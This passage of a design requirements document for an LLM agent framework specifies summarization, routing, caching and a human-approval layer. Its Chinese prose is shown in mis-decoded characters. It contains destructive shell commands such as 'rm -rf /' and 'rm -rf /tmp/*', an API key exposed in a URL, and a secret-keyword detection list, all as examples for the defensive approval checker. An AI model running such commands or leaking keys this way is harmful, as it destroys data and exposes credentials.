# ç¤ºä¾‹ï¼šrun_bash_command("rm -rf /") éœ€è¦ç”¨æˆ·ç¡®è®¤

tools_node = ApprovalToolNode(
    tools=all_discovered_tools,
    approval_checker=approval_checker,
    enable_approval=True
)
```

**é”™è¯¯å¤„ç†**ï¼š

| é”™è¯¯ç±»å‹ | ToolMessage å†…å®¹ | æ—¥å¿—çº§åˆ« |
|---------|----------------|---------|
| å·¥å…·æœªæ‰¾åˆ° | "Error: Tool 'xxx' not found" | ERROR |
| å‚æ•°é”™è¯¯ | "Error: Invalid arguments for 'xxx': ..." | WARNING |
| æ‰§è¡Œå¼‚å¸¸ | "Error: Tool execution failed: ..." | ERROR |
| éœ€è¦å®¡æ‰¹è¢«æ‹’ç» | "Operation cancelled by user" | INFO |

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… æ”¯æŒå¹¶å‘æ‰§è¡Œå¤šä¸ªå·¥å…·è°ƒç”¨
- âœ… æ”¯æŒå·¥å…·æŒ‰éœ€åŠ è½½ï¼ˆload_on_demandï¼‰
- âœ… æ”¯æŒ HITL å®¡æ‰¹æ‹¦æˆª
- âœ… é”™è¯¯æ¶ˆæ¯æ¸…æ™°ï¼ŒåŒ…å«å·¥å…·åç§°å’Œå‚æ•°
- âœ… è¿”å›åˆ°è°ƒç”¨æ–¹ Agentï¼ˆæ”¯æŒ Handoff Patternï¼‰

**å®ç°å‚è€ƒ**ï¼š`generalAgent/graph/builder.py:105-122`ã€`generalAgent/hitl/approval_node.py`

---

#### éœ€æ±‚ 5ï¼šFinalize èŠ‚ç‚¹ï¼ˆæœ€ç»ˆè¾“å‡ºï¼‰

**éœ€æ±‚æè¿°**ï¼š
å®ç° Finalize èŠ‚ç‚¹ï¼Œè´Ÿè´£åœ¨ Agent Loop ç»“æŸæ—¶æ ¼å¼åŒ–æœ€ç»ˆè¾“å‡ºã€‚

**è§¦å‘æ¡ä»¶**ï¼š
- LLM æ²¡æœ‰ç”Ÿæˆ tool_calls
- Loop è®¡æ•°å™¨è¾¾åˆ° max_loops
- æœ€åä¸€æ¡æ¶ˆæ¯æ˜¯ ToolMessageï¼ˆéœ€è¦ç”Ÿæˆè‡ªç„¶è¯­è¨€å›å¤ï¼‰

**æ ¸å¿ƒé€»è¾‘**ï¼š

```
1. æ£€æŸ¥æœ€åä¸€æ¡æ¶ˆæ¯æ˜¯å¦ä¸º ToolMessage
   - å¦‚æœä¸æ˜¯ï¼Œè·³è¿‡ Finalizeï¼ˆLLM å·²ç»ç”Ÿæˆæœ€ç»ˆå›å¤ï¼‰
2. æ¸…ç†æ¶ˆæ¯å†å²ï¼ˆç§»é™¤æ— æ•ˆ tool_callsï¼‰
3. å®‰å…¨æˆªæ–­æ¶ˆæ¯å†å²ï¼ˆä¿ç•™æœ€è¿‘ N æ¡ï¼Œé»˜è®¤ 40ï¼‰
4. è°ƒç”¨ LLMï¼ˆæ— å·¥å…·ç»‘å®šï¼‰
5. è¿”å›æœ€ç»ˆ AIMessage
```

**SystemMessage**ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š

```
ä½ æ˜¯ä¸€ä¸ªæ™ºèƒ½åŠ©æ‰‹ã€‚ç°åœ¨è¯·æ ¹æ®å·¥å…·æ‰§è¡Œç»“æœï¼Œç”Ÿæˆæœ€ç»ˆå›å¤ç»™ç”¨æˆ·ã€‚

è¦æ±‚ï¼š
- æ€»ç»“å·¥å…·æ‰§è¡Œç»“æœ
- ç”¨è‡ªç„¶è¯­è¨€è¡¨è¾¾
- å¦‚æœæœ‰é”™è¯¯ï¼Œè§£é‡ŠåŸå› 

<current_datetime>2025-10-31 12:34 UTC</current_datetime>
```

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… ä»…åœ¨æœ€åä¸€æ¡æ¶ˆæ¯æ˜¯ ToolMessage æ—¶æ‰§è¡Œ
- âœ… ä¸ç»‘å®šä»»ä½•å·¥å…·ï¼ˆé¿å…ç»§ç»­å¾ªç¯ï¼‰
- âœ… æ­£ç¡®å¤„ç†æ¶ˆæ¯å†å²æˆªæ–­
- âœ… ç”Ÿæˆè‡ªç„¶è¯­è¨€å›å¤

**å®ç°å‚è€ƒ**ï¼š`generalAgent/graph/nodes/finalize.py`

---

#### éœ€æ±‚ 6ï¼šSummarization èŠ‚ç‚¹ï¼ˆè‡ªåŠ¨å‹ç¼©ï¼‰

**éœ€æ±‚æè¿°**ï¼š
å®ç° Summarization èŠ‚ç‚¹ï¼Œè´Ÿè´£åœ¨ Token ä½¿ç”¨ç‡è¶…è¿‡ 95% æ—¶è‡ªåŠ¨å‹ç¼©æ¶ˆæ¯å†å²ã€‚

**è§¦å‘æ¡ä»¶**ï¼š
- `needs_compression = True`ï¼ˆPlanner è®¾ç½®ï¼‰
- `auto_compressed_this_request = False`ï¼ˆé˜²æ­¢é‡å¤å‹ç¼©ï¼‰
- æ¶ˆæ¯æ•°é‡ â‰¥ `min_messages_to_compress`ï¼ˆé»˜è®¤ 15 æ¡ï¼‰

**å‹ç¼©ç­–ç•¥**ï¼š

| ç­–ç•¥ | é€‚ç”¨åœºæ™¯ | ä¿ç•™å†…å®¹ | å‹ç¼©æ–¹å¼ |
|------|---------|---------|---------|
| LLM å‹ç¼© | é¦–é€‰ | æœ€è¿‘ 15% context window çš„æ¶ˆæ¯ | LLM æ€»ç»“æ‘˜è¦ |
| ç´§æ€¥æˆªæ–­ | LLM å‹ç¼©å¤±è´¥ | æœ€è¿‘ 100 æ¡æ¶ˆæ¯ | ç›´æ¥åˆ é™¤æ—§æ¶ˆæ¯ |

**å‹ç¼©æµç¨‹**ï¼š

```
1. æ£€æŸ¥æ˜¯å¦éœ€è¦å‹ç¼©
2. è®¡ç®—ä¿ç•™æ¶ˆæ¯æ•°é‡
   - åŸºäº Token æ¯”ä¾‹ï¼šcontext_window * keep_recent_ratioï¼ˆé»˜è®¤ 15%ï¼‰
   - åŸºäºæ¶ˆæ¯æ•°é‡ï¼škeep_recent_messagesï¼ˆé»˜è®¤ 10 æ¡ï¼‰
   - å–ä¸¤è€…ä¸­å…ˆè¾¾åˆ°çš„é˜ˆå€¼
3. è°ƒç”¨ LLM å‹ç¼©æ—§æ¶ˆæ¯
   - æç¤ºè¯ï¼šè¯·æ€»ç»“ä»¥ä¸‹å¯¹è¯å†…å®¹ï¼Œä¿ç•™å…³é”®ä¿¡æ¯...
4. ç”Ÿæˆå‹ç¼©åæ¶ˆæ¯åˆ—è¡¨
   - [SystemMessage, å‹ç¼©æ‘˜è¦ AIMessage, æœ€è¿‘ N æ¡æ¶ˆæ¯]
5. é‡ç½® Token è®¡æ•°å™¨
6. è¿”å› Planner èŠ‚ç‚¹ç»§ç»­æ‰§è¡Œ
```

**ç”¨æˆ·ä½“éªŒ**ï¼š
- ç”¨æˆ·**æ— æ„ŸçŸ¥**ï¼ˆä¸æ˜¾ç¤ºå‹ç¼©é€šçŸ¥ï¼‰
- å¯¹è¯ä¸Šä¸‹æ–‡ä¿ç•™å®Œæ•´è¯­ä¹‰
- Agent ç»§ç»­å›ç­”åŸå§‹é—®é¢˜

**ç¤ºä¾‹**ï¼š

```
å‹ç¼©å‰: 302 æ¡æ¶ˆæ¯ï¼ˆ123K tokensï¼‰
å‹ç¼©å: 13 æ¡æ¶ˆæ¯ï¼ˆ6.5K tokensï¼‰
å‹ç¼©æ¯”: 95%
ç­–ç•¥: LLM å‹ç¼©
```

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… Token ä½¿ç”¨ç‡ >95% æ—¶è‡ªåŠ¨è§¦å‘
- âœ… ä¿ç•™æœ€è¿‘ 15% context window çš„æ¶ˆæ¯ï¼ˆæˆ–è‡³å°‘ 10 æ¡ï¼‰
- âœ… LLM å‹ç¼©å¤±è´¥æ—¶å›é€€åˆ°ç´§æ€¥æˆªæ–­
- âœ… ç”¨æˆ·æ— æ„ŸçŸ¥ï¼ˆæ— é€šçŸ¥æ¶ˆæ¯ï¼‰
- âœ… å‹ç¼©åæ­£ç¡®é‡ç½® Token è®¡æ•°å™¨

**å®ç°å‚è€ƒ**ï¼š`generalAgent/graph/nodes/summarization.py`ã€`generalAgent/context/manager.py`

---

#### éœ€æ±‚ 7ï¼šæ¶ˆæ¯å†å²ç®¡ç†

**éœ€æ±‚æè¿°**ï¼š
æä¾›æ¶ˆæ¯å†å²æ¸…ç†å’Œå®‰å…¨æˆªæ–­åŠŸèƒ½ï¼Œç¡®ä¿ OpenAI API å…¼å®¹æ€§ã€‚

**æ¸…ç†è§„åˆ™**ï¼š

```python
# generalAgent/graph/message_utils.py:clean_message_history()
# ç§»é™¤æœªè¢«å“åº”çš„ tool_calls

è§„åˆ™ï¼š
- æ”¶é›†æ‰€æœ‰ ToolMessage.tool_call_id
- éå† AIMessageï¼Œæ£€æŸ¥å…¶ tool_calls æ˜¯å¦éƒ½æœ‰å¯¹åº”çš„ ToolMessage
- å¦‚æœæœ‰æœªå“åº”çš„ tool_callsï¼Œç§»é™¤æ•´ä¸ª AIMessage
```

**æˆªæ–­ç­–ç•¥**ï¼š

```python
# generalAgent/graph/message_utils.py:truncate_messages_safely()
# å®‰å…¨æˆªæ–­æ¶ˆæ¯å†å²ï¼Œä¿ç•™ AIMessage-ToolMessage å¯¹

è§„åˆ™ï¼š
- ä¿ç•™æœ€è¿‘ N æ¡æ¶ˆæ¯ï¼ˆé»˜è®¤ 40ï¼‰
- å¦‚æœä¿ç•™çš„ ToolMessage æœ‰å¯¹åº”çš„ AIMessageï¼Œå¿…é¡»ä¸€èµ·ä¿ç•™
- ä¿ç•™æ‰€æœ‰ SystemMessageï¼ˆä¸è®¡å…¥ Nï¼‰
```

**ç¤ºä¾‹**ï¼š

```
åŸå§‹å†å²: 100 æ¡æ¶ˆæ¯
æ¸…ç†å: 95 æ¡æ¶ˆæ¯ï¼ˆç§»é™¤ 5 æ¡æœªå“åº”çš„ AIMessageï¼‰
æˆªæ–­å: 40 æ¡æ¶ˆæ¯ï¼ˆä¿ç•™æœ€è¿‘å¯¹è¯ + SystemMessageï¼‰
```

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… æ¸…ç†æœªå“åº”çš„ tool_callsï¼ˆé¿å… OpenAI API é”™è¯¯ï¼‰
- âœ… æˆªæ–­æ—¶ä¿ç•™ AIMessage-ToolMessage å¯¹
- âœ… å§‹ç»ˆä¿ç•™ SystemMessage
- âœ… å¯é…ç½®æˆªæ–­é˜ˆå€¼ï¼ˆMAX_MESSAGE_HISTORYï¼‰

**å®ç°å‚è€ƒ**ï¼š`generalAgent/graph/message_utils.py`

---

#### éœ€æ±‚ 8ï¼šè·¯ç”±é€»è¾‘

**éœ€æ±‚æè¿°**ï¼š
å®ç°ä¸‰ä¸ªè·¯ç”±å‡½æ•°ï¼Œæ§åˆ¶ Agent Loop çš„æ‰§è¡Œæµç¨‹ã€‚

**agent_route**ï¼ˆPlanner èŠ‚ç‚¹åï¼‰ï¼š

```python
# generalAgent/graph/routing.py:agent_route()

ä¼˜å…ˆçº§ï¼š
1. æ£€æŸ¥ Loop é™åˆ¶ï¼ˆloops >= max_loops â†’ finalizeï¼‰
2. æ£€æŸ¥å‹ç¼©éœ€æ±‚ï¼ˆneeds_compression â†’ summarizationï¼‰
3. æ£€æŸ¥å·¥å…·è°ƒç”¨ï¼ˆtool_calls â†’ toolsï¼Œå¦åˆ™ finalizeï¼‰
```

**tools_route**ï¼ˆTools èŠ‚ç‚¹åï¼‰ï¼š

```python
# generalAgent/graph/routing.py:tools_route()

è¿”å›å€¼ï¼š
- å¦‚æœæœ‰ Handoffï¼ˆcurrent_agent å·²æ›´æ–°ï¼‰ï¼Œè¿”å›ç›®æ ‡ Agent
- å¦åˆ™è¿”å› "agent"ï¼ˆä¸» Agentï¼‰
```

**summarization_route**ï¼ˆSummarization èŠ‚ç‚¹åï¼‰ï¼š

```python
# generalAgent/graph/routing.py:summarization_route()

è¿”å›å€¼ï¼š
- å§‹ç»ˆè¿”å› "agent"ï¼ˆå‹ç¼©å®Œæˆåç»§ç»­æ‰§è¡Œï¼‰
```

**è·¯ç”±å†³ç­–æ—¥å¿—**ï¼š

```
[2025-10-31 12:34:56] [routing] agent â†’ tools (LLM requested 2 tool call(s))
[2025-10-31 12:34:58] [routing] tools â†’ agent (Tool execution complete)
[2025-10-31 12:35:00] [routing] agent â†’ summarization (Token usage 96%, needs compression)
[2025-10-31 12:35:05] [routing] summarization â†’ agent (Compression complete)
[2025-10-31 12:35:07] [routing] agent â†’ finalize (No tool calls, LLM decided to finish)
```

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… è·¯ç”±ä¼˜å…ˆçº§æ­£ç¡®ï¼ˆLoop é™åˆ¶ > å‹ç¼© > å·¥å…·è°ƒç”¨ï¼‰
- âœ… æ”¯æŒ Handoff Patternï¼ˆMulti-Agentï¼‰
- âœ… è®°å½•è·¯ç”±å†³ç­–æ—¥å¿—

**å®ç°å‚è€ƒ**ï¼š`generalAgent/graph/routing.py`

---

#### éœ€æ±‚ 9ï¼šKV Cache ä¼˜åŒ–

**éœ€æ±‚æè¿°**ï¼š
ä¼˜åŒ– SystemMessage å’Œæé†’æœºåˆ¶ï¼Œæœ€å¤§åŒ– KV Cache å¤ç”¨ç‡ï¼Œé™ä½æ¨ç†æˆæœ¬ã€‚

**ä¼˜åŒ–ç­–ç•¥**ï¼š

| ä¼˜åŒ–ç‚¹ | æ–¹æ³• | æ•ˆæœ |
|--------|------|------|
| å›ºå®š SystemMessage | å¯åŠ¨æ—¶ç”Ÿæˆä¸€æ¬¡ï¼ŒåŒ…å«æ—¶é—´æˆ³ï¼ˆåˆ†é’Ÿçº§ï¼‰ | 70-90% KV Cache å¤ç”¨ |
| åŠ¨æ€æé†’åç½® | è¿½åŠ åˆ°æœ€åä¸€æ¡ HumanMessageï¼Œä¸ä¿®æ”¹ SystemMessage | æé«˜ Cache å‘½ä¸­ç‡ |
| æ—¶é—´æˆ³ç²¾åº¦é™çº§ | åˆ†é’Ÿçº§ï¼ˆHH:MMï¼‰è€Œéç§’çº§ï¼ˆHH:MM:SSï¼‰ | åŒä¸€åˆ†é’Ÿå†… 100% å¤ç”¨ |

**SystemMessage ç»“æ„**ï¼š

```python
# å¯åŠ¨æ—¶ç”Ÿæˆä¸€æ¬¡ï¼Œæ•´ä¸ªä¼šè¯æœŸé—´ä¸å˜
system_prompt = f"""
{PLANNER_SYSTEM_PROMPT}  # å›ºå®šæŒ‡ä»¤

{skills_catalog}  # å¯ç”¨çš„æŠ€èƒ½åˆ—è¡¨ï¼ˆé™æ€ï¼‰

{agents_catalog}  # å¯ç”¨çš„ Agent åˆ—è¡¨ï¼ˆé™æ€ï¼‰

<current_datetime>2025-10-31 12:34 UTC</current_datetime>  # åˆ†é’Ÿçº§æ—¶é—´æˆ³
"""
```

**åŠ¨æ€æé†’ç¤ºä¾‹**ï¼š

```python
# è¿½åŠ åˆ°æœ€åä¸€æ¡ HumanMessage
last_message.content += """

<system_reminder>
âš ï¸ æ£€æµ‹åˆ°ä¸Šä¼ æ–‡ä»¶: report.pdf
å»ºè®®ä½¿ç”¨ @pdf æŠ€èƒ½å¤„ç†
</system_reminder>

<system_reminder>
âš ï¸ Token ä½¿ç”¨ç‡: 82% (è­¦å‘Šé˜ˆå€¼ 85%)
å»ºè®®å‹ç¼©ä¸Šä¸‹æ–‡ï¼ˆä½¿ç”¨ compact_context å·¥å…·ï¼‰
</system_reminder>
"""
```

**æˆæœ¬å¯¹æ¯”**ï¼š

| åœºæ™¯ | ä¼ ç»Ÿæ–¹å¼ | ä¼˜åŒ–å | æˆæœ¬é™ä½ |
|------|---------|--------|---------|
| çŸ­å¯¹è¯ï¼ˆ10 è½®ï¼‰ | 100% å…¨é‡è®¡ç®— | 90% KV Cache å¤ç”¨ | 60% |
| é•¿å¯¹è¯ï¼ˆ100 è½®ï¼‰ | 100% å…¨é‡è®¡ç®— | 70% KV Cache å¤ç”¨ | 80% |

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… SystemMessage åœ¨ä¼šè¯æœŸé—´å›ºå®šä¸å˜
- âœ… æ—¶é—´æˆ³ç²¾åº¦ä¸ºåˆ†é’Ÿçº§ï¼ˆHH:MM UTCï¼‰
- âœ… åŠ¨æ€æé†’è¿½åŠ åˆ°æœ€åä¸€æ¡ HumanMessage
- âœ… å¤šè½®å¯¹è¯ä¸­ KV Cache å¤ç”¨ç‡ â‰¥70%

**å®ç°å‚è€ƒ**ï¼š`generalAgent/graph/nodes/planner.py:86-107`ã€`generalAgent/graph/nodes/finalize.py:34-42`

---

### éåŠŸèƒ½éœ€æ±‚

#### æ€§èƒ½éœ€æ±‚

| æŒ‡æ ‡ | ç›®æ ‡å€¼ | æµ‹é‡æ–¹æ³• |
|------|--------|---------|
| Planner èŠ‚ç‚¹è€—æ—¶ | <5s | ä»è¿›å…¥åˆ°è¿”å›çš„æ—¶é—´ |
| Tools èŠ‚ç‚¹è€—æ—¶ | <3s | å•ä¸ªå·¥å…·æ‰§è¡Œæ—¶é—´ |
| Summarization è€—æ—¶ | <10s | LLM å‹ç¼©æ—¶é—´ |
| Loop ååé‡ | â‰¥10 loops/min | å®Œæ•´å¯¹è¯æµç¨‹æµ‹è¯• |
| Token è¿½è¸ªå¼€é”€ | <10ms | extract_token_usage() è€—æ—¶ |

#### å¯é æ€§éœ€æ±‚

| éœ€æ±‚ | è¯´æ˜ | éªŒæ”¶æ ‡å‡† |
|------|------|----------|
| æ¶ˆæ¯ä¸€è‡´æ€§ | AIMessage-ToolMessage å¯¹å®Œæ•´ | clean_message_history() æµ‹è¯• |
| Loop é™åˆ¶ç”Ÿæ•ˆ | è¶…è¿‡ max_loops æ—¶å¼ºåˆ¶ç»“æŸ | å‹åŠ›æµ‹è¯• |
| å‹ç¼©é™çº§ç­–ç•¥ | LLM å‹ç¼©å¤±è´¥æ—¶å›é€€æˆªæ–­ | å¼‚å¸¸æ³¨å…¥æµ‹è¯• |
| çŠ¶æ€éš”ç¦» | Subagent ä¸æ±¡æŸ“ä¸» Agent çŠ¶æ€ | å•å…ƒæµ‹è¯• |

#### å¯è§‚æµ‹æ€§éœ€æ±‚

| éœ€æ±‚ | è¯´æ˜ | éªŒæ”¶æ ‡å‡† |
|------|------|----------|
| Loop è®¡æ•°æ—¥å¿— | æ¯æ¬¡ Loop è®°å½• loops/max_loops | æ—¥å¿—æ£€æŸ¥ |
| Token è¿½è¸ªæ—¥å¿— | æ¯æ¬¡ LLM è°ƒç”¨è®°å½• token ä½¿ç”¨ | æ—¥å¿—æ£€æŸ¥ |
| è·¯ç”±å†³ç­–æ—¥å¿— | è®°å½•æ¯æ¬¡è·¯ç”±é€‰æ‹©åŠåŸå›  | æ—¥å¿—æ£€æŸ¥ |
| å‹ç¼©ç»Ÿè®¡æ—¥å¿— | è®°å½•å‹ç¼©å‰åæ¶ˆæ¯æ•°å’Œå‹ç¼©æ¯” | æ—¥å¿—æ£€æŸ¥ |

---

### å‚è€ƒä»£ç ä½ç½®

| åŠŸèƒ½æ¨¡å— | ä»£ç è·¯å¾„ |
|---------|---------|
| çŠ¶æ€å®šä¹‰ | `generalAgent/graph/state.py` |
| Graph æ„å»º | `generalAgent/graph/builder.py` |
| Planner èŠ‚ç‚¹ | `generalAgent/graph/nodes/planner.py` |
| Finalize èŠ‚ç‚¹ | `generalAgent/graph/nodes/finalize.py` |
| Summarization èŠ‚ç‚¹ | `generalAgent/graph/nodes/summarization.py` |
| è·¯ç”±é€»è¾‘ | `generalAgent/graph/routing.py` |
| æ¶ˆæ¯å¤„ç†å·¥å…· | `generalAgent/graph/message_utils.py` |
| ä¸Šä¸‹æ–‡ç®¡ç†å™¨ | `generalAgent/context/manager.py` |
| Token è¿½è¸ªå™¨ | `generalAgent/context/token_tracker.py` |
| ç³»ç»Ÿæç¤ºè¯ | `generalAgent/graph/prompts.py` |

---

## äº”ã€HITL äººæœºååŒ

### äº§å“å®šä½

HITL (Human-in-the-Loop) äººæœºååŒæœºåˆ¶æ˜¯æ¡†æ¶çš„å®‰å…¨é˜²æŠ¤å±‚,æä¾›ä¸¤ç§äº¤äº’æ¨¡å¼:**Agent ä¸»åŠ¨è¯·æ±‚**(ask_human å·¥å…·)å’Œ**ç³»ç»Ÿè‡ªåŠ¨æ‹¦æˆª**(å·¥å…·å®¡æ‰¹æ¡†æ¶)ã€‚é€šè¿‡å››å±‚å®¡æ‰¹è§„åˆ™æ£€æµ‹å±é™©æ“ä½œ,åœ¨æ‰§è¡Œå‰æš‚åœå¹¶è¯·æ±‚ç”¨æˆ·ç¡®è®¤,åŒæ—¶å¯¹ LLM å®Œå…¨é€æ˜,ä¸æ±¡æŸ“å¯¹è¯ä¸Šä¸‹æ–‡ã€‚

**ä»·å€¼ä¸»å¼ **:
- **å®‰å…¨é˜²æŠ¤**:è‡ªåŠ¨æ£€æµ‹æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ç³»ç»Ÿæ–‡ä»¶æ“ä½œã€å±é™©å‘½ä»¤ç­‰é«˜é£é™©è¡Œä¸º
- **çµæ´»æ§åˆ¶**:æ”¯æŒå…¨å±€è§„åˆ™ã€å·¥å…·çº§è§„åˆ™ã€è‡ªå®šä¹‰æ£€æŸ¥å™¨ä¸‰å±‚é…ç½®
- **ç”¨æˆ·ä½“éªŒ**:å®¡æ‰¹å†³ç­–ä¸è¿›å…¥å¯¹è¯å†å²,LLM æ— æ„ŸçŸ¥,é¿å…è¯¯å¯¼æ¨¡å‹è¡Œä¸º
- **å¯è§‚æµ‹æ€§**:å®Œæ•´çš„å®¡æ‰¹æ—¥å¿—ã€é£é™©çº§åˆ«æ ‡è®°ã€æ‹’ç»åŸå› è®°å½•

---

### æ ¸å¿ƒåœºæ™¯

#### åœºæ™¯ 1:Agent ä¸»åŠ¨è¯·æ±‚ä¿¡æ¯

**ç”¨æˆ·æ•…äº‹**:
ç”¨æˆ·è¦æ±‚"ç”Ÿæˆå­£åº¦æŠ¥å‘Š",Agent éœ€è¦çŸ¥é“æŠ¥å‘Šæ ¼å¼åå¥½(PDF/Word/Markdown)æ‰èƒ½ç»§ç»­ã€‚

**ç³»ç»Ÿè¡Œä¸º**:
1. Agent è°ƒç”¨ ask_human å·¥å…·
2. ç³»ç»Ÿæš‚åœ Graph æ‰§è¡Œ(interrupt)
3. ç”¨æˆ·çœ‹åˆ°é—®é¢˜:"æ‚¨å¸Œæœ›æŠ¥å‘Šä»¥ä»€ä¹ˆæ ¼å¼è¾“å‡º?(é»˜è®¤: markdown)"
4. ç”¨æˆ·è¾“å…¥"PDF"
5. ç³»ç»Ÿæ¢å¤æ‰§è¡Œ,Agent æ”¶åˆ°ç­”æ¡ˆ
6. Agent ç»§ç»­ç”Ÿæˆ PDF æŠ¥å‘Š

**å…³é”®ç‚¹**:
- å¯¹è¯æµç¨‹è‡ªç„¶,ç”¨æˆ·æ„ŸçŸ¥ä¸ºè¿ç»­äº¤äº’
- ask_human å“åº”è®°å½•åœ¨å¯¹è¯å†å²ä¸­(ä½œä¸º ToolMessage)
- æ”¯æŒé»˜è®¤å€¼ã€å¿…å¡«/å¯é€‰é…ç½®

---

#### åœºæ™¯ 2:è‡ªåŠ¨æ‹¦æˆªå±é™©æ“ä½œ

**ç”¨æˆ·æ•…äº‹**:
ç”¨æˆ·è¦æ±‚"æ¸…ç†ä¸´æ—¶æ–‡ä»¶",Agent å†³å®šæ‰§è¡Œ `rm -rf /tmp/*`,ç³»ç»Ÿéœ€è¦é˜²æ­¢è¯¯æ“ä½œã€‚

**ç³»ç»Ÿè¡Œä¸º**:
1. Agent ç”Ÿæˆ tool_call: `run_bash_command("rm -rf /tmp/*")`
2. ApprovalToolNode æ‹¦æˆª,æ£€æµ‹åˆ°é«˜é£é™©æ¨¡å¼ `rm -rf`
3. ç³»ç»Ÿæš‚åœæ‰§è¡Œ,æ˜¾ç¤ºå®¡æ‰¹è¯·æ±‚:
   ```
   ğŸ›¡ï¸  å·¥å…·å®¡æ‰¹: run_bash_command
      é£é™©çº§åˆ«: high
      åŸå› : æ£€æµ‹åˆ°é«˜é£é™©æ“ä½œ
      å‘½ä»¤: rm -rf /tmp/*
      æ‰¹å‡†? [y/n] >
   ```
4. ç”¨æˆ·è¾“å…¥ `n`(æ‹’ç»)
5. ç³»ç»Ÿè¿”å› ToolMessage: "âŒ æ“ä½œå·²å–æ¶ˆ: æ£€æµ‹åˆ°é«˜é£é™©æ“ä½œ"
6. Agent æ”¶åˆ°æ‹’ç»æ¶ˆæ¯,æå‡ºæ›¿ä»£æ–¹æ¡ˆ

**å…³é”®ç‚¹**:
- å®¡æ‰¹è¿‡ç¨‹å¯¹ LLM é€æ˜(ä¸è¿›å…¥å¯¹è¯å†å²)
- ç”¨æˆ·å¯ä»¥æ‰¹å‡†æˆ–æ‹’ç»
- æ‹’ç»å Agent èƒ½è‡ªåŠ¨è°ƒæ•´ç­–ç•¥

---

#### åœºæ™¯ 3:æ•æ„Ÿä¿¡æ¯æ³„éœ²æ£€æµ‹

**ç”¨æˆ·æ•…äº‹**:
ç”¨æˆ·è¦æ±‚"å‘é€ API é…ç½®åˆ°æœåŠ¡å™¨",Agent å‡†å¤‡è°ƒç”¨ `http_fetch("https://api.example.com?key=sk-xxx")`,ç³»ç»Ÿéœ€è¦æ£€æµ‹ API Key æ³„éœ²ã€‚

**ç³»ç»Ÿè¡Œä¸º**:
1. ApprovalChecker å…¨å±€æ¨¡å¼æ£€æµ‹åˆ° `api_key` å…³é”®è¯
2. åŒ¹é… critical çº§åˆ«é£é™©æ¨¡å¼
3. æš‚åœæ‰§è¡Œ,æ˜¾ç¤ºè­¦å‘Š:
   ```
   ğŸ›¡ï¸  å·¥å…·å®¡æ‰¹: http_fetch
      é£é™©çº§åˆ«: critical
      åŸå› : æ£€æµ‹åˆ°æ•æ„Ÿä¿¡æ¯(å¯†ç /å¯†é’¥/ä»¤ç‰Œ)
      URL: https://api.example.com?key=sk-xxx
      æ‰¹å‡†? [y/n] >
   ```
4. ç”¨æˆ·æ„è¯†åˆ° API Key æš´éœ²åœ¨ URL ä¸­
5. æ‹’ç»æ‰§è¡Œ,è¦æ±‚ Agent ä½¿ç”¨ Header ä¼ é€’

**å…³é”®ç‚¹**:
- å…¨å±€æ¨¡å¼è·¨å·¥å…·æ£€æµ‹(http_fetchã€run_bash_command ç­‰)
- æ•æ„Ÿä¿¡æ¯æ¨¡å¼:passwordã€api_keyã€secretã€tokenã€private_key
- ä¼˜å…ˆçº§æœ€é«˜(åœ¨å·¥å…·ç‰¹å®šè§„åˆ™ä¹‹å‰æ£€æŸ¥)

---

### åŠŸèƒ½éœ€æ±‚

#### éœ€æ±‚ 1:ask_human å·¥å…·(Agent ä¸»åŠ¨è¯·æ±‚)

**éœ€æ±‚æè¿°**:
æä¾› ask_human å·¥å…·,å…è®¸ Agent åœ¨éœ€è¦é¢å¤–ä¿¡æ¯æ—¶ä¸»åŠ¨å‘ç”¨æˆ·æé—®ã€‚

**å·¥å…·ç­¾å**:

```python
@tool
def ask_human(
    question: str,
    context: str = "",
    default: Optional[str] = None,
    required: bool = True
) -> str:
    """å‘ç”¨æˆ·æé—®å¹¶ç­‰å¾…å›å¤

    Args:
        question: è¦é—®çš„é—®é¢˜
        context: é¢å¤–ä¸Šä¸‹æ–‡ä¿¡æ¯(å¸®åŠ©ç”¨æˆ·ç†è§£)
        default: é»˜è®¤å€¼(ç”¨æˆ·ç›´æ¥å›è½¦æ—¶ä½¿ç”¨)
        required: æ˜¯å¦å¿…å¡«(False æ—¶ç”¨æˆ·å¯è·³è¿‡)

    Returns:
        ç”¨æˆ·çš„å›ç­”(å­—ç¬¦ä¸²)
    """
```

**ä½¿ç”¨ç¤ºä¾‹**:

```python
# Agent å†…éƒ¨é€»è¾‘(è‡ªåŠ¨ç”Ÿæˆçš„ tool_call)
answer = ask_human(
    question="æ‚¨å¸Œæœ›æŠ¥å‘Šä»¥ä»€ä¹ˆæ ¼å¼è¾“å‡º?",
    context="æ”¯æŒçš„æ ¼å¼: PDF, Word, Markdown",
    default="markdown",
    required=True
)
```

**äº¤äº’æµç¨‹**:

```
1. Agent è°ƒç”¨ ask_human å·¥å…·
   â†“
2. ç³»ç»Ÿè°ƒç”¨ interrupt() æš‚åœæ‰§è¡Œ
   â†“
3. CLI æ˜¾ç¤ºé—®é¢˜ç»™ç”¨æˆ·
   ğŸ’¬ æ‚¨å¸Œæœ›æŠ¥å‘Šä»¥ä»€ä¹ˆæ ¼å¼è¾“å‡º?
      ä¸Šä¸‹æ–‡: æ”¯æŒçš„æ ¼å¼: PDF, Word, Markdown
      (é»˜è®¤: markdown)
   > _
   â†“
4. ç”¨æˆ·è¾“å…¥ç­”æ¡ˆ
   â†“
5. ç³»ç»Ÿæ¢å¤æ‰§è¡Œ,è¿”å› ToolMessage(content=ç”¨æˆ·ç­”æ¡ˆ)
   â†“
6. Agent ç»§ç»­æ‰§è¡Œ,ä½¿ç”¨ç”¨æˆ·æä¾›çš„ä¿¡æ¯
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ”¯æŒé—®é¢˜ã€ä¸Šä¸‹æ–‡ã€é»˜è®¤å€¼ã€å¿…å¡«æ ‡å¿—
- âœ… ä½¿ç”¨ interrupt() æš‚åœ Graph æ‰§è¡Œ
- âœ… ç”¨æˆ·ç­”æ¡ˆè®°å½•åœ¨å¯¹è¯å†å²(ToolMessage)
- âœ… æ”¯æŒè¶…æ—¶(é»˜è®¤ 60s,å¯é…ç½®)

**å®ç°å‚è€ƒ**:`generalAgent/tools/builtin/ask_human.py`

---

#### éœ€æ±‚ 2:å››å±‚å®¡æ‰¹è§„åˆ™æ¶æ„

**éœ€æ±‚æè¿°**:
